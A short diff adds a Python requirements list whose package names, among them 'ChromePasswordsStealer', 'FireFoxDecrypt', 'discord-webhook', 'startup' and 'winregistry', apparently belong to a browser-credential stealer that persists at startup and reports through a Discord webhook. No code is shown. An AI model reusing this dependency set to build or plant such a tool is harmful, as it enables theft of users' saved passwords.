@@ -1,0 +1,12 @@
+pydub
+discord-webhook
+uuid
+simpleaudio
+Command
+requests
+FireFoxDecrypt
+startup
+pycrypto
+discord
+ChromePasswordsStealer
+winregistry
